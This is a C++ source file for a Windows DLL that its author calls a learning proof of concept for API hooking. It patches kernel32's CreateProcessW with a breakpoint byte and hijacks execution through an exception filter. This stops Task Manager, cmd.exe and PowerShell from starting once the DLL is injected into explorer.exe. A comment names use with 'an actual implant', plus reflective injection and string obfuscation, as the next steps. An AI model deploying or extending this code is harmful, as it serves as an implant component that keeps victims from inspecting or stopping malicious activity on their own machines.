﻿// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <Windows.h>
#include <string.h>

FARPROC fpCreateProcessW;
BYTE bSavedByte;

BOOL WriteMemory(FARPROC fpFunc, LPBYTE b, SIZE_T size)
{
	DWORD dwOldProtect = 0;

	if (VirtualProtect(fpFunc, size, PAGE_EXECUTE_READWRITE, &dwOldProtect) == NULL)
	{
		OutputDebugString(L"Could not overwrite original CreateProcessW function");
		return FALSE;
	}

	MoveMemory(fpFunc, b, size);

	return VirtualProtect(fpFunc, size, dwOldProtect, &dwOldProtect);
}

VOID HookFunction(VOID)
{
	fpCreateProcessW = GetProcAddress(LoadLibrary(L"kernel32"), "CreateProcessW");

	if (fpCreateProcessW == NULL)
	{
		OutputDebugString(L"Failed to get address for CreatePRocessW function");
		return;
	}

	bSavedByte = *(LPBYTE)fpCreateProcessW;

	BYTE bInt3 = 0xCC;

	if (WriteMemory(fpCreateProcessW, &bInt3, sizeof(BYTE)) == FALSE) {
		OutputDebugString(L"Failed to hook function");
		ExitThread(0);
	}
}

BOOL WINAPI MyCreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
{
	//If certain "black listed" applications tries run, prevent them from it :)
	if (wcsstr(lpApplicationName,L"taskmgr.exe") != NULL || wcsstr(lpApplicationName,L"cmd.exe") != NULL || wcsstr(lpApplicationName, L"powershell.exe") != NULL)
	{
		OutputDebugString(L"Hooked CreateProcessW call");
		SetLastError(ERROR_ACCESS_DENIED);
		return FALSE;
	}

	// If the Process is not on the "black list" restor the original address and execute the original CreatePRocessW function
	OutputDebugString(L"Restoring origianl address to CreateProcessW");
	if (WriteMemory(fpCreateProcessW, &bSavedByte, sizeof(BYTE)) == FALSE)
	{
		OutputDebugString(L"Failed to restore original address to CreateProcessW");
		ExitThread(0);
	}

	BOOL b = CreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

	HookFunction();

	return b;
}


LONG MyUnhandledExceptionFilter(LPEXCEPTION_POINTERS lpException)
{
#ifdef _WIN64
	if (lpException->ContextRecord->Rip == (DWORD_PTR)CreateProcessW)
	{
		lpException->ContextRecord->Rip = (DWORD_PTR)MyCreateProcessW;
	}
#else
	if (lpException->ContextRecord->Eip == (DWORD_PTR)CreateProcessW)
	{
		lpException->ContextRecord->Eip = (DWORD_PTR)MyCreateProcessW;
	}
#endif

	return EXCEPTION_CONTINUE_EXECUTION;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
		/*
		This is just a small POC project that i developed to learn API hooking. The DLL needs to be injected into the explorer process. To test this code I have only used process hacker to inject
		the DLL. But if the code is to be used combined with an actual implant i wolud ofcorse rewrite it to support relfelctive dll injection, and remove debug strings etc,string obfuscation 
		and optimize i. There is also other ways to perform API hooking. This is not a particular stealth way to do it... But you learn from it.
		to perform API hooking.
		*/
    case DLL_PROCESS_ATTACH:
		OutputDebugString(L"Starting API Hooking");
		//PrintDebugString();
		SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)MyUnhandledExceptionFilter); 
		HookFunction();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

